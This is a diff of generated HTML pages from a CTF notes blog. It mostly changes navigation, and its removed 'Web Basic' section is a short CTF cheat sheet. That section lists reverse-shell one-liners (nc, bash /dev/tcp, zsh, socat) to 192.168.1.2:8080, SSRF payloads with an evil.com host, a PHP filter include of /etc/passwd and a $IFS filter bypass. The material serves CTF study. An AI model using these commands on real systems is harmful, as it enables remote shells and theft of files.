@@ -13,7 +13,7 @@
         <meta name="description" content="Windforce17's blog">
       
       
-        <link rel="canonical" href="https://windforce17.github.io/blog/ctf/web/basic/">
+        <link rel="canonical" href="https://windforce17.github.io/blog/ctf/pwn/heap/">
       
       
         <meta name="author" content="Windforce17">
@@ -42,7 +42,7 @@
     
     
       
-        <title>Basic - windforce17's blog</title>
+        <title>Heap - windforce17's blog</title>
       
     
     
@@ -133,7 +133,7 @@
                 windforce17's blog
               </span>
               <span class="md-header-nav__topic">
-                Basic
+                Heap
               </span>
             
           
@@ -1590,10 +1590,12 @@
           
           
 
+  
 
-  <li class="md-nav__item md-nav__item--nested">
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-7" type="checkbox" id="nav-8-7">
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-7" type="checkbox" id="nav-8-7" checked>
     
     <label class="md-nav__link" for="nav-8-7">
       Pwn
@@ -1611,7 +1613,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../pwn/basic/" title="Basic" class="md-nav__link">
+    <a href="../basic/" title="Basic" class="md-nav__link">
       Basic
     </a>
   </li>
@@ -1621,11 +1623,51 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../../pwn/heap/" title="Heap" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Heap
+      </label>
+    
+    <a href="./" title="Heap" class="md-nav__link md-nav__link--active">
       Heap
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="堆数据结构" class="md-nav__link">
+    堆数据结构
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -1635,7 +1677,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../../pwn/tools/" title="Tools" class="md-nav__link">
+    <a href="../tools/" title="Tools" class="md-nav__link">
       Tools
     </a>
   </li>
@@ -1710,12 +1752,10 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+  <li class="md-nav__item md-nav__item--nested">
     
-      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-9" type="checkbox" id="nav-8-9" checked>
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-9" type="checkbox" id="nav-8-9">
     
     <label class="md-nav__link" for="nav-8-9">
       Web
@@ -1731,79 +1771,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        Basic
-      </label>
-    
-    <a href="./" title="Basic" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../../web/basic/" title="Basic" class="md-nav__link">
       Basic
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary">
-  
-  
-  
-    <label class="md-nav__title" for="__toc">目录</label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" title="基础脑洞/思路" class="md-nav__link">
-    基础脑洞/思路
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#shell" title="反弹shell" class="md-nav__link">
-    反弹shell
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrfpayload" title="ssrf常用payload" class="md-nav__link">
-    ssrf常用payload
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#php7-bug" title="php7 直接崩溃bug" class="md-nav__link">
-    php7 直接崩溃bug
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ifs" title="$IFS" class="md-nav__link">
-    $IFS
-  </a>
-  
-</li>
-      
-      
-      
-      
-      
-        <li class="md-nav__item">
-          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
-            评论
-          </a>
-        </li>
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -1813,7 +1785,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../php文件包含/" title="Php文件包含" class="md-nav__link">
+    <a href="../../web/php文件包含/" title="Php文件包含" class="md-nav__link">
       Php文件包含
     </a>
   </li>
@@ -1825,7 +1797,7 @@
 
 
   <li class="md-nav__item">
-    <a href="../ssti/" title="Ssti" class="md-nav__link">
+    <a href="../../web/ssti/" title="Ssti" class="md-nav__link">
       Ssti
     </a>
   </li>
@@ -2064,36 +2036,8 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#_1" title="基础脑洞/思路" class="md-nav__link">
-    基础脑洞/思路
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#shell" title="反弹shell" class="md-nav__link">
-    反弹shell
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ssrfpayload" title="ssrf常用payload" class="md-nav__link">
-    ssrf常用payload
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#php7-bug" title="php7 直接崩溃bug" class="md-nav__link">
-    php7 直接崩溃bug
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#ifs" title="$IFS" class="md-nav__link">
-    $IFS
+  <a href="#_1" title="堆数据结构" class="md-nav__link">
+    堆数据结构
   </a>
   
 </li>
@@ -2120,32 +2064,12 @@
             <article class="md-content__inner md-typeset">
               
                 
-                  <a href="https://github.com/Windforce17/blog/blob/master/docs/ctf/web/basic.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                  <a href="https://github.com/Windforce17/blog/blob/master/docs/ctf/pwn/heap.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                 
                 
-                  <h1>Basic</h1>
+                  <h1>Heap</h1>
                 
-                <h2 id="_1">基础脑洞/思路<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<ol>
-<li>index.php?id=1  遍历id 注入</li>
-<li>robots.txt .git .svn .swp ~ .bak 源码，目录泄露
-  .git泄露利用EXP
-  <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li>
-</ol>
-<h2 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
-<div class="codehilite"><pre><span></span>nc -e /bin/bash <span class="m">192</span>.168.1.2 <span class="m">8080</span>
-bash -c <span class="s1">&#39;bash -i &gt;/dev/tcp/192.168.1.2/8080 0&gt;&amp;1&#39;</span>
-zsh -c <span class="s1">&#39;zmodload zsh/net/tcp &amp;&amp; ztcp 192.168.1.2 8080 &amp;&amp; zsh &gt;&amp;$REPLY 2&gt;&amp;$REPLY 0&gt;&amp;$REPLY&#39;</span>
-socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.1.2:8080  
-</pre></div>
-
-<h2 id="ssrfpayload">ssrf常用payload<a class="headerlink" href="#ssrfpayload" title="Permanent link">&para;</a></h2>
-<p><code>admin=1&amp;url=file://www.ichunqiu.com/var/www/html/flag.php</code>
-<code>file://user@evil.com:80@www.google.com//var/www/html/index.php%23</code></p>
-<h2 id="php7-bug">php7 直接崩溃bug<a class="headerlink" href="#php7-bug" title="Permanent link">&para;</a></h2>
-<p><code>include(‘php://filter/string.strip_tags/resource=/etc/passwd’)</code></p>
-<h2 id="ifs">$IFS<a class="headerlink" href="#ifs" title="Permanent link">&para;</a></h2>
-<p>空格可以使用$IFS代替</p>
+                <h2 id="_1">堆数据结构<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
                 
                   
                 
@@ -2191,7 +2115,7 @@ socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,s
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid">
         
-          <a href="../../reverse/unpack/" title="脱壳" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../basic/" title="Basic" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-flex__cell md-flex__cell--shrink">
               <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
             </div>
@@ -2200,19 +2124,19 @@ socat exec:<span class="s1">&#39;bash -li&#39;</span>,pty,stderr,setsid,sigint,s
                 <span class="md-footer-nav__direction">
                   后退
                 </span>
-                脱壳
+                Basic
               </span>
             </div>
           </a>
         
         
-          <a href="../php文件包含/" title="Php文件包含" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../tools/" title="Tools" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
               <span class="md-flex__ellipsis">
                 <span class="md-footer-nav__direction">
                   前进
                 </span>
-                Php文件包含
+                Tools
               </span>
             </div>
             <div class="md-flex__cell md-flex__cell--shrink">
